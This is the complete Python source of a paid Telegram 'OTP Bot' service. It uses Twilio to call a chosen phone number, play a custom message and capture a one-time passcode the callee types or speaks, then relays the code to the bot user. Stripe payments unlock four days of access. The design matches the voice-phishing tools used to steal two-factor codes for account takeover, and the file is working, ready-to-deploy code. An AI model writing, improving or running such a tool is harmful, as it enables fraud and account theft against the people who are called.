# otp.py
import os
import asyncio
import threading
import logging
from datetime import datetime, timedelta, timezone
from urllib.parse import quote

import requests
from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters
)
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
import stripe

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("otp")

# -------------------------
# Config / Secrets
PORT = int(os.environ.get("PORT", 5000))
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")
PUBLIC_BASE_URL = os.environ.get("NGROK_URL") or RENDER_EXTERNAL_URL

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN") or "YOUR_TELEGRAM_TOKEN"

TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID") or "YOUR_TWILIO_SID"
TWILIO_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN") or "YOUR_TWILIO_AUTH_TOKEN"
TWILIO_PHONE_NUMBER = os.environ.get("TWILIO_PHONE_NUMBER") or "+1234567890"
twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

STRIPE_SECRET_KEY = os.environ.get("STRIPE_SECRET_KEY") or "YOUR_STRIPE_KEY"
stripe.api_key = STRIPE_SECRET_KEY

if not PUBLIC_BASE_URL:
    log.warning("PUBLIC_BASE_URL is not set. Set RENDER_EXTERNAL_URL or NGROK_URL.")

# -------------------------
# State storage
user_phone = {}      # Telegram user -> phone number
phone_to_chat = {}   # phone -> Telegram chat ID
captured_otp = {}    # phone -> OTP
last_message = {}    # Telegram user -> last custom message
paid_users = {6910149689: datetime.now(timezone.utc) + timedelta(days=4)}  # seed user

# -------------------------
# Helpers
def is_paid(user_id: int) -> bool:
    return user_id in paid_users and datetime.now(timezone.utc) < paid_users[user_id]

def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
    keyboard = []
    keyboard.append([InlineKeyboardButton("📱 Set Phone", callback_data="menu_setphone")])
    if user_id in user_phone:
        keyboard.append([InlineKeyboardButton("📞 Make Call", callback_data="menu_call")])
    if not is_paid(user_id):
        keyboard.append([InlineKeyboardButton("💳 Pay $25 / 4 Days", callback_data="menu_pay")])
    keyboard.append([InlineKeyboardButton("ℹ️ Help / Usage", callback_data="menu_help")])
    return InlineKeyboardMarkup(keyboard)

def create_checkout_session(user_id: int, customer_email: str | None = None) -> str:
    if not PUBLIC_BASE_URL:
        raise RuntimeError("PUBLIC_BASE_URL is not set; cannot create Stripe URLs.")
    session = stripe.checkout.Session.create(
        payment_method_types=["card"],
        line_items=[{
            "price_data": {
                "currency": "usd",
                "product_data": {"name": "4-Day Survivor Access"},
                "unit_amount": 2500,
            },
            "quantity": 1,
        }],
        mode="payment",
        customer_email=customer_email,
        success_url=f"{PUBLIC_BASE_URL}/success?user_id={user_id}",
        cancel_url=f"{PUBLIC_BASE_URL}/cancel"
    )
    return session.url

# -------------------------
# Telegram Bot
application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Yoda's OTP Bot!\n\nUse the buttons below:",
        reply_markup=get_main_keyboard(update.effective_user.id)
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id if update.effective_chat else (
        update.callback_query.message.chat.id if update.callback_query else None
    )
    if update.callback_query:
        await update.callback_query.answer()
    if chat_id:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "ℹ️ *How to use this bot:*\n\n"
                "1. Tap *📱 Set Phone* to save your number.\n"
                "2. Tap *📞 Make Call* and enter your custom message.\n"
                "3. The bot will call you and capture the OTP.\n"
                "4. You’ll get the OTP back in this chat ✅"
            ),
            parse_mode="Markdown",
            reply_markup=get_main_keyboard(update.effective_user.id)
        )

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data.startswith("menu_"):
        action = query.data.split("_")[1]

        if action == "pay":
            try:
                checkout_url = create_checkout_session(user_id=uid)
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"💳 Complete payment here: {checkout_url}"
                )
            except Exception as e:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"❌ Could not start checkout: {e}"
                )

        elif action == "setphone":
            context.user_data["awaiting_phone"] = True
            await query.edit_message_text(
                "📱 Send your phone number in the format: `+1XXXXXXXXXX`",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data="menu_main")]])
            )

        elif action == "call":
            if uid not in user_phone:
                await query.edit_message_text(
                    "⚠️ Please set your phone first.",
                    reply_markup=get_main_keyboard(uid)
                )
            else:
                context.user_data["awaiting_message"] = True
                await query.edit_message_text(
                    "📞 Send your custom message for the call or type `/call` to reuse your last message.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu_main")],
                        [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="menu_help")]
                    ])
                )

        elif action == "help":
            await help_command(update, context)

        elif action == "main":
            await query.edit_message_text("Main Menu:", reply_markup=get_main_keyboard(uid))

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()

    if not is_paid(uid):
        await update.message.reply_text("💰 You must pay $25 for 4 days to use this feature.")
        return

    if context.user_data.get("awaiting_phone"):
        user_phone[uid] = text
        phone_to_chat[text] = update.effective_chat.id
        context.user_data["awaiting_phone"] = False
        await update.message.reply_text(
            f"✅ Phone number saved: {text}\nChoose an option below:",
            reply_markup=get_main_keyboard(uid)
        )
        return

    if context.user_data.get("awaiting_message"):
        last_message[uid] = text
        context.user_data["awaiting_message"] = False
        phone = user_phone[uid]
        if not PUBLIC_BASE_URL:
            await update.message.reply_text("❌ Server URL not configured. Set RENDER_EXTERNAL_URL.")
            return
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{PUBLIC_BASE_URL}/voice?msg={quote(text)}",
            status_callback=f"{PUBLIC_BASE_URL}/call_status",
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
            status_callback_method='POST'
        )
        await update.message.reply_text(f"📞 Calling {phone} now with your message...")
        return

    if text == "/call":
        if uid not in last_message:
            await update.message.reply_text("⚠️ No previous message found. Please send a new one.")
            return
        phone = user_phone.get(uid)
        if not phone:
            await update.message.reply_text("⚠️ Please set your phone first with 📱 Set Phone.")
            return
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{PUBLIC_BASE_URL}/voice?msg={quote(last_message[uid])}",
            status_callback=f"{PUBLIC_BASE_URL}/call_status",
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
            status_callback_method='POST'
        )
        await update.message.reply_text(f"📞 Re-calling {phone} with your last message...")

# Register handlers
application.add_handler(CommandHandler("start", start))
application.add_handler(CallbackQueryHandler(handle_buttons))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

# -------------------------
# Flask routes
flask_app = Flask(__name__)

@flask_app.route("/", methods=["GET"])
def root():
    return "OK", 200

@flask_app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
def telegram_webhook():
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return "no json", 200
        update = Update.de_json(data, application.bot)
        fut = asyncio.run_coroutine_threadsafe(application.process_update(update), bot_loop)
        fut.result(timeout=10)
        return "OK", 200
    except Exception as e:
        log.exception("webhook error: %s", e)
        return "OK", 200

@flask_app.route("/voice", methods=["POST", "GET"])
def voice():
    message = request.args.get("msg", "Please enter your OTP now.")
    resp = VoiceResponse()
    gather = Gather(
        input="dtmf speech",
        timeout=10,
        num_digits=6,
        action=f"{PUBLIC_BASE_URL}/capture",
        method="POST"
    )
    gather.say(message)
    gather.say("Now, please enter or speak your OTP.")
    resp.append(gather)
    resp.say("No input received. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/capture", methods=["POST"])
def capture():
    otp = request.values.get("Digits") or request.values.get("SpeechResult")
    to_number = request.values.get("To")
    log.info("Twilio /capture To=%s OTP=%s", to_number, otp)

    if to_number and otp:
        captured_otp[to_number] = otp
        chat_id = phone_to_chat.get(to_number)
        if chat_id:
            try:
                fut = asyncio.run_coroutine_threadsafe(
                    application.bot.send_message(chat_id=chat_id, text=f"📩 Captured OTP: {otp}"),
                    bot_loop
                )
                fut.result(timeout=5)
            except Exception:
                log.exception("Failed to send OTP to Telegram")

    resp = VoiceResponse()
    resp.say("Thanks! Your OTP has been captured. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/call_status", methods=["POST"])
def call_status():
    call_status_val = request.values.get("CallStatus")
    to_number = request.values.get("To")
    chat_id = phone_to_chat.get(to_number)
    log.info("Call status %s for %s", call_status_val, to_number)

    if chat_id:
        status_map = {
            "initiated": "📞 Call has been initiated.",
            "ringing": "📲 Call is ringing.",
            "answered": "✅ Call was picked up.",
            "completed": "📴 Call has ended.",
            "no-answer": "❌ Call was not answered."
        }
        msg = status_map.get(call_status_val, f"ℹ️ Call status: {call_status_val}")
        try:
            fut = asyncio.run_coroutine_threadsafe(
                application.bot.send_message(chat_id=chat_id, text=msg),
                bot_loop
            )
            fut.result(timeout=5)

            # After call ends, show main menu automatically
            if call_status_val == "completed":
                fut_menu = asyncio.run_coroutine_threadsafe(
                    application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(chat_id)),
                    bot_loop
                )
                fut_menu.result(timeout=5)

        except Exception:
            log.exception("Failed to send call status to Telegram")
    return ("", 204)


@flask_app.route("/success")
def payment_success():
    user_id = request.args.get("user_id")
    if not user_id:
        return "Error: user ID not found."
    user_id = int(user_id)
    paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
    return f"✅ Payment received! User {user_id} now has access for 4 days."

@flask_app.route("/cancel")
def payment_cancel():
    return "Payment canceled. You do not have access."

# -------------------------
# Bot loop thread
def bot_loop_thread():
    global bot_loop
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)

    async def _startup():
        await application.initialize()
        await application.start()
        if PUBLIC_BASE_URL:
            try:
                url = f"{PUBLIC_BASE_URL}/{TELEGRAM_TOKEN}"
                await application.bot.set_webhook(url)
                log.info("Webhook set to %s", url)
            except Exception:
                log.exception("Failed to set webhook")

    bot_loop.run_until_complete(_startup())
    log.info("Bot loop running.")
    bot_loop.run_forever()

t = threading.Thread(target=bot_loop_thread, name="bot-loop", daemon=True)
t.start()

# -------------------------
# Main Flask runner
if __name__ == "__main__":
    log.info("Starting Flask on port %s", PORT)
    flask_app.run(host="0.0.0.0", port=PORT)

